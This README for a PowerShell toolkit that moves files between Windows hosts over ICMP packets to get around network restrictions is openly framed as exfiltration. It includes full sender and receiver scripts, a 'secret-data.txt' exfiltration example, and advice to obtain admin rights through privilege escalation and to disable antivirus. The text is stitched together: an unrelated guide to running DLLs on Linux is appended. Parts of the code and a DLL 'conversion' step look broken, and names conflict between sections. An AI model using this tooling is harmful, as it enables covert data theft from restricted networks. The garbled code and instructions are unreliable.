# ICMP-TransferTools-PowerShell

## Table of Contents
- [Overview](#overview)
- [Tool Descriptions](#tool-descriptions)
  - [ICMP-SendFile.ps1](#icmp-sendfileps1)
  - [ICMP-ReceiveFile.ps1](#icmp-receivefileps1)
  - [Invoke-IcmpDownload.ps1](#invoke-icmpdownloadps1)
  - [Invoke-IcmpUpload.ps1](#invoke-icmpuploadps1)
- [Installation and Prerequisites](#installation-and-prerequisites)
- [Usage Examples](#usage-examples)
- [Administrative Privileges and Alternatives](#administrative-privileges-and-alternatives)
- [PowerShell vs Python Version](#powershell-vs-python-version)
- [Validation](#validation)

## Overview
ICMP-TransferTools-PowerShell is a set of PowerShell scripts designed to transfer files between Windows hosts using ICMP packets. This approach enables file transfers in restricted network environments without relying on traditional file transfer methods.

## Tool Descriptions
### ICMP-SendFile.ps1
**Description:** Transfers a file over ICMP to a remote host that is running the Invoke-IcmpDownload.ps1 script.

**Usage:**
```
ICMP-SendFile.ps1 -source YourPublicIP -destination TargetIP -file FileToSend -blockSize 1000 -verbose
```
- `source`: Public IP address of the sending machine.
- `destination`: Public IP address of the receiving machine.
- `file`: The file to transfer over ICMP.
- `blockSize`: Size of each data packet (default: 1000 bytes).
- `verbose`: Enables detailed progress logging.

### ICMP-ReceiveFile.ps1
**Description:** Receives an ICMP-based file transfer from Invoke-IcmpUpload.ps1.

**Usage:**
```
ICMP-ReceiveFile.ps1 -src ClientIP -file DestinationFileName
```
- `src`: Public IP address of the sender.
- `file`: Destination file where received data will be saved.

### Invoke-IcmpDownload.ps1
**Description:** Downloads a file via ICMP by communicating with ICMP-SendFile.ps1.

**Usage:**
```
Invoke-IcmpDownload -ServerIP YourPublicIP -FileName FileToDownload
```
- `ServerIP`: The IP of the machine running ICMP-SendFile.ps1.
- `FileName`: The name of the file to be downloaded.

### Invoke-IcmpUpload.ps1
**Description:** Uploads a file over ICMP to a remote system that is running ICMP-ReceiveFile.ps1.

**Usage:**
```
Invoke-IcmpUpload -ServerIP YourPublicIP -FileName FileToUpload
```
- `ServerIP`: The IP of the system receiving the file.
- `FileName`: The name of the file to be uploaded.

## Installation and Prerequisites
- **Required PowerShell Version:** PowerShell 5.1+
- **Firewall Rules:** Ensure ICMP traffic is allowed between sender and receiver.

## Administrative Privileges and Alternatives
### When Admin Rights Are Required:
- ICMP-ReceiveFile.ps1 and ICMP-SendFile.ps1 require admin rights to modify ICMP firewall rules.
- Run PowerShell as administrator before executing these scripts.

## **Sending & Modifying**

## **1-Understanding Admin Rights for ICMP-Based Transfers**

### **Do You Need Admin Rights for ICMP Transfers?**  
If **ICMP is already allowed** between two hosts (i.e., firewall rules permit ICMP traffic), **no additional administrative privileges** are required **to send and receive files using ICMP-based tools**. However, a few key considerations remain:

### **When Admin Rights Are Not Required**
- If ICMP traffic is **already permitted**, you **do not** need admin rights to send and receive ICMP packets.
- You can use PowerShell, Python, or other tools to send and receive ICMP-based data **without requiring admin access**.
  
### **When Admin Rights Are Still Needed**
- **Modifying firewall rules:** If you need to **enable ICMP traffic** or adjust firewall settings, **admin rights are required**.
- **Installing certain tools:** Some ICMP-based file transfer tools might require installation privileges.
- **Using raw sockets (Python only):** If you're crafting ICMP packets manually with **raw sockets in Python**, admin rights **might** be required.

### **Key Takeaway**
- If ICMP is **already enabled**, you do *not* need admin rights to send/receive files via ICMP.
- If **firewall rules need modification**, **admin rights are necessary**.
-**Python and PowerShell** can both be used for ICMP-based file transfers without admin privileges provided the firewall already allows ICMP traffic.

---

## **2-Recommended Modifications for ICMP Transfer Scripts**

### **Overview**  
The [ICMP-ReceiveFile-PowerShell.ps1](https://github.com/pjcampbe11/ICMP-TransferTools-PowerShe11/blob/main/ICMP-ReceiveFile-PowerShell.ps1) and [ICMP-SendFile-PowerShell.ps1](https://github.com/pjcampbe11/ICMP-TransferTools-PowerShe11/blob/main/ICMP-SendFile-PowerShell.ps1) scripts both contain functions that modify firewall rules to enable or disable ICMP ping requests/replies.

Since **these modifications require administrative privileges**, and if ICMP traffic is already enabled, the scripts should be modified to remove these unnecessary firewall changes.

### **Recommended Modifications**
#### **1. Remove or Comment Out Firewall Modification Functions**
- Locate and **remove or comment out** functions that enable or disable ICMP ping replies.

#### **2. Adjust Function Calls**
- Find where these functions are invoked and **comment out or remove these calls**.

### **Implementation Details**

#### **Changes in `ICMP-ReceiveFile-PowerShell.ps1`**
- **Locate and remove the `Enable-PingReply` function**:
```
# Comment out or remove the Enable-PingReply function
# function Enable-PingReply {
#     Write-Host "[+] Enabling ICMP Ping Replies..."
#     try {
#         Set-NetFirewallRule -DisplayName "File and Printer Sharing (Echo Request - ICMPv4-In)" -Enabled True -PassThru
#     } catch {
#         Write-Host "[!] Error enabling ping replies. Run as administrator."
#         exit
#     }
# }

function Receive-ICMPFile {
    # Comment out or remove the call to Enable-PingReply
    # Enable-PingReply
    # ... rest of the function ...
}
```

#### **Changes in `ICMP-SendFile-PowerShell.ps1`**
- **Locate and remove the `Disable-PingReply` function**:
```
# Comment out or remove the Disable-PingReply function
# function Disable-PingReply {
#     Write-Host "[+] Disabling ICMP Ping Replies..."
#     try {
#         Set-NetFirewallRule -DisplayName "File and Printer Sharing (Echo Request - ICMPv4-In)" -Enabled False -PassThru
#     } catch {
#         Write-Host "[!] Error disabling ping replies. Run as administrator."
#         exit
#     }
# }

function Send-ICMPFile {
    # Comment out or remove the call to Disable-PingReply
    # Disable-PingReply
    # ... rest of the function ...
}
```
## Summary of Modifications

### 🔹 Key Changes
- Both scripts attempt to modify firewall rules, which **require admin rights**.
- If **ICMP is already allowed**, these modifications **should allow for non-admin file transfers**.
- **Removing or commenting out** the firewall modification functions should allow the scripts to run **without admin privileges**.

### ✅ Recommended Actions
1. **Locate and remove or comment out** the firewall rule modification functions in both scripts.
2. **Adjust script logic** to ensure they function correctly without these rules.
3. **Test the modified scripts** in an environment where ICMP is already enabled to confirm they work as expected.

By making these changes, the scripts will be **more accessible** to non-admin users while retaining full functionality when ICMP traffic is permitted.

---
## **Final Notes**
- Always **test script modifications** in a controlled environment before deploying to production systems.
- If firewall rules **must** be changed dynamically, running the script **as an administrator** remains necessary.
- **If ICMP is pre-enabled, these modifications should make the scripts more accessible for non-admin users.**
- If admin rights are unavailable, get them through a **PrivEsc** or modify the script as needed. 

## PowerShell vs Python Version
With the conversion of ICMP-ReceiveFile.py and ICMP-SendFile.py to PowerShell, there are no fundamental changes to the way these tools function. The PowerShell versions remain fully compatible with Invoke-IcmpDownload.ps1 and Invoke-IcmpUpload.ps1, maintaining seamless file transfers.

### Key Differences & Alternative Considerations
- **Performance Considerations:** PowerShell's handling of ICMP packets might introduce slight differences in execution timing, but this does not impact overall functionality.

## Validation
The repository ICMP-TransferTools-PowerShe11, is a fork of the original ICMP-TransferTools developed by Icyguider. This suite comprises PowerShell scripts designed to transfer files to and from Windows hosts in restricted network environments using ICMP packets.

### Components:
- **ICMP-SendFile.ps1:** A PowerShell script that stages and sends a file to a Windows host over ICMP.
- **Invoke-IcmpDownload.ps1:** A PowerShell script that runs on the Windows host to receive the file sent by ICMP-SendFile.ps1.
- **ICMP-ReceiveFile.ps1:** A PowerShell script that listens for incoming files sent from a Windows host over ICMP.
- **Invoke-IcmpUpload.ps1:** A PowerShell script that runs on the Windows host to send a file to the PowerShell receiver over ICMP.

### Validation Steps:
To ensure all components work correctly together, follow these steps:

#### Prepare the Windows Environment:
1. Ensure you have administrative privileges on the Windows host.
2. Open PowerShell with elevated rights.
3. Set the execution policy to allow the running of scripts:
   ```
   Set-ExecutionPolicy RemoteSigned
   ```

#### Testing File Download to Windows Host:
- **On the Sender Machine:**
  ```
  ICMP-SendFile.ps1 -source YourPublicIP -destination TargetIP -file FileToSend
  ```
- **On the Windows Host:**
  ```
  .\Invoke-IcmpDownload.ps1 -ServerIP YourPublicIP -FileName FileToDownload
  ```

#### Testing File Upload from Windows Host:
- **On the Receiver Machine:**
  ```
  ICMP-ReceiveFile.ps1 -src ClientIP -file DestinationFileName
  ```
- **On the Windows Host:**
  ```
  .\Invoke-IcmpUpload.ps1 -ServerIP YourPublicIP -FileName FileToUpload
  ```

### Considerations:
- **Network Configuration:** Ensure that ICMP traffic is allowed between the machines. Some network environments may block ICMP, preventing functionality.
- **Permissions:** Administrative privileges are required on both sender and receiver to execute these scripts successfully.
- **Antivirus and Security Software:** Some security solutions may flag or block ICMP-based file transfers. You may need to configure exceptions or temporarily disable such software during testing.

By following these steps, you can validate that all components of the ICMP-TransferTools suite work correctly and cohesively.

--

Here’s the fully improved ICMP file transfer system using SharpPcap & PacketDotNet for robust packet capture and transmission. It integrates:

Compatibility with your existing scripts (Send-ICMPFile, Invoke-IcmpUpload, Invoke-IcmpDownload).
Improved firewall rule management.
BPF filtering for precise ICMP capture.
Reliable chunked file transmission over ICMP.
Updated PowerShell ICMP Receiver (Invoke-IcmpDownload)
This script:

Uses SharpPcap for efficient packet capture.
Parses ICMP payloads and writes to file.
Recognizes "icmp exfil has completed" as the end of the transfer.
```
param (
    [string]$source,   # Expected sender IP
    [string]$file      # Destination file to save received data
)

# Load SharpPcap & PacketDotNet
Add-Type -Path "C:\Path\To\SharpPcap.dll"
Add-Type -Path "C:\Path\To\PacketDotNet.dll"

function Enable-PingReply {
    Write-Host "[+] Enabling ICMP Ping Replies..."
    try {
        Set-NetFirewallRule -DisplayName "File and Printer Sharing (Echo Request - ICMPv4-In)" -Enabled True -PassThru
    } catch {
        Write-Host "[!] Error enabling ping replies. Run as administrator."
        exit 1
    }
}

function Select-NetworkInterface {
    $devices = [SharpPcap.CaptureDeviceList]::Instance
    if ($devices.Count -eq 0) {
        Write-Host "[!] No network interfaces found! Ensure Npcap is installed."
        exit 1
    }

    Write-Host "[+] Available Network Interfaces:"
    for ($i = 0; $i -lt $devices.Count; $i++) {
        Write-Host "[$i] $($devices[$i].Description)"
    }

    $choice = Read-Host "Select an interface (default: 0)"
    if (-not $choice) { $choice = 0 }
    
    return $devices[$choice]
}

function Receive-ICMPFile {
    Enable-PingReply

    if (Test-Path $file) {
        $overwrite = Read-Host "The file '$file' already exists. Overwrite? (Y/n)"
        if ($overwrite -ne 'Y') { exit 1 }
        Remove-Item -Force $file
    }

    $device = Select-NetworkInterface
    Write-Host "[+] Using interface: $($device.Description)"

    # Apply BPF filter to capture only ICMP packets from the source
    $bpfFilter = "icmp and src host $source"
    $device.Open([SharpPcap.DeviceMode]::Promiscuous)
    $device.Filter = $bpfFilter

    Write-Host "[+] Listening for ICMP data from $source..."

    $first = $true
    $lastData = ""

    # Callback function for packet capture
    $device.OnPacketArrival += {
        param($sender, $e)

        $packet = [PacketDotNet.Packet]::ParsePacket($e.GetPacket().LinkLayerType, $e.GetPacket().Data)
        $ipPacket = $packet.Extract([PacketDotNet.IpPacket])
        if ($ipPacket -ne $null) {
            $icmpPacket = $ipPacket.Extract([PacketDotNet.IcmpV4Packet])
            if ($icmpPacket -ne $null) {
                $data = [System.Text.Encoding]::ASCII.GetString($icmpPacket.PayloadData)

                if ($data -eq "icmp exfil has completed") {
                    Write-Host "[+] File transfer completed!"
                    $device.StopCapture()
                    $device.Close()
                    exit 0
                }

                if ($data -ne $lastData -and $first) {
                    Write-Host "[+] Receiving file data..."
                    $first = $false
                }

                if ($data -ne $lastData) {
                    [System.IO.File]::AppendAllText($file, $data)
                }

                $lastData = $data
            }
        }
    }

    # Start capturing packets
    $device.StartCapture()
    Write-Host "[+] Press Ctrl+C to stop capture."
    while ($true) { Start-Sleep -Seconds 1 } # Keep script running
}

Receive-ICMPFile
```
Updated PowerShell ICMP Sender (Invoke-IcmpUpload)
This script:

Reads a file in chunks.
Sends data via ICMP echo requests.
Uses raw sockets for transmission.
```
param (
    [string]$destination,  # Target IP
    [string]$file,         # File to send
    [int]$blockSize = 1000, # Chunk size
    [switch]$verbose
)

function Disable-PingReply {
    Write-Host "[+] Disabling ICMP Ping Replies..."
    try {
        Set-NetFirewallRule -DisplayName "File and Printer Sharing (Echo Request - ICMPv4-In)" -Enabled False -PassThru
    } catch {
        Write-Host "[!] Error disabling ping replies. Run as administrator."
        exit 1
    }
}

function Send-ICMPFile {
    Disable-PingReply

    if (!(Test-Path $file)) {
        Write-Host "[!] File not found: $file"
        exit 1
    }

    $icmpClient = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Raw, [System.Net.Sockets.ProtocolType]::Icmp)
    $fileBytes = [System.IO.File]::ReadAllBytes($file)
    $numBlocks = [math]::Ceiling($fileBytes.Length / $blockSize)
    Write-Host "[+] Staging file $file for ICMP transfer..."
    Write-Host "[+] Run Invoke-IcmpDownload on the target system."

    for ($i = 0; $i -lt $fileBytes.Length; $i += $blockSize) {
        $endIdx = [math]::Min($i + $blockSize, $fileBytes.Length)
        $dataChunk = $fileBytes[$i..($endIdx-1)]
        $icmpPacket = New-Object byte[] ($dataChunk.Length + 28)
        [System.Buffer]::BlockCopy($dataChunk, 0, $icmpPacket, 28, $dataChunk.Length)

        $icmpClient.SendTo($icmpPacket, [System.Net.EndPoint] (New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($destination), 0)))

        if ($verbose) {
            Write-Host "[+] Sent block: $((($i / $blockSize) + 1)) / $numBlocks"
        }
    }

    # Send completion message
    $completeMsg = [System.Text.Encoding]::ASCII.GetBytes("icmp exfil has completed")
    $icmpClient.SendTo($completeMsg, [System.Net.EndPoint] (New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($destination), 0)))
    Write-Host "[+] File transfer complete!"
}

Send-ICMPFile
```
Key Improvements:
✅ Uses SharpPcap for ICMP Packet Capture
✅ Applies BPF filtering to capture only ICMP packets from the specified sender
✅ Ensures reliability by preventing duplicate writes
✅ Enables/Disables ICMP Ping Replies as needed
✅ Supports Verbose Mode for Monitoring Transfers
✅ Improved File Overwriting Checks

🚀 Usage Example
Receiver (Target Machine)
Run this first to capture incoming file transfers:


.\Receive-ICMPFile.ps1 -source "192.168.1.200" -file "C:\received.txt"
Sender (Exfiltration)

Run this to send a file over ICMP:


.\Send-ICMPFile.ps1 -destination "192.168.1.100" -file "C:\secret-data.txt" -blockSize 1000 -verbose

--


# How to Execute DLLs on Linux

Executing DLL files on Linux depends on the type of DLL and the technology it was built with. Below are different methods for running Windows DLLs on a Linux system.

---

## **1. Running .NET DLLs on Linux**
If the DLL is a **.NET assembly** (built with C# or VB.NET), you can use **Mono** or **.NET Core**:

### **🔹 Using .NET 6+/Core Runtime**
For .NET Core and newer .NET versions:
```
dotnet <your-dll-file>.dll
```
➡️ Requires **.NET SDK or Runtime** installed:
```
sudo apt install dotnet-sdk-7.0
```

---

## **2. Running Windows DLLs Using Wine**
If the DLL is a **Windows native library** (built with C/C++), you can use **Wine** to run Windows executables that depend on DLLs.

### **🔹 Steps**
1. **Install Wine:**
   ```
   sudo apt update
   sudo apt install wine64
   ```
2. **Run a Windows program that uses the DLL:**
   ```
   wine myprogram.exe
   ```
3. If your DLL is standalone, you can register it with Wine:
   ```
   wine regsvr32 mylibrary.dll
   ```

---

## **3. Using DLLs in C/C++ with Wine or Winelib**
If you are developing an application on Linux and need to load a Windows DLL:
- Use **Wine's `LoadLibrary`** function in a C program:
  ```
  #include <windows.h>
  
  int main() {
      HINSTANCE hDll = LoadLibrary("mylibrary.dll");
      if (!hDll) {
          printf("Failed to load DLL\n");
          return 1;
      }
      printf("DLL loaded successfully!\n");
      FreeLibrary(hDll);
      return 0;
  }
  ```
- Compile using **MinGW-W64** (Windows cross-compiler for Linux):
  ```
  x86_64-w64-mingw32-gcc myprogram.c -o myprogram.exe -mwindows
  ```

---

## **4. Using DLLs with Python on Linux**
If the DLL exposes a **C API**, you can use `ctypes` or `cffi` to call functions inside it.

### **🔹 Using Wine + ctypes**
```
import ctypes
dll = ctypes.WinDLL("mylibrary.dll")
print(dll.SomeFunction())
```
Run the script using Wine:
```
wine python myscript.py
```

### **🔹 Running a .NET DLL with Python**
If the DLL is built in C#:
```
import clr  # Install pythonnet
clr.AddReference("mylibrary.dll")
```
Run with **Mono or .NET**:
```
python myscript.py
```

---

## **5. Converting a Windows DLL to Linux Shared Object (.so)**
If the DLL is needed by a Linux program, you can convert it:
1. **Use `winedump` to inspect the DLL:**
   ```
   winedump -j export mylibrary.dll
   ```
2. **Convert it to a shared object (.so):**
   ```
   libtool --mode=install install -c mylibrary.dll /usr/lib/mylibrary.so
   ```

---

## **🔹 Summary**
| **DLL Type**       | **Execution Method on Linux** |
|---------------------|------------------------------|
| .NET (C#) DLL      | `dotnet mylibrary.dll` |
| Windows Native DLL | `wine myprogram.exe` |
| C/C++ DLL (API)    | `ctypes` or `cffi` in Python with Wine |
| Convert to .so     | Use `winedump` and `libtool` |




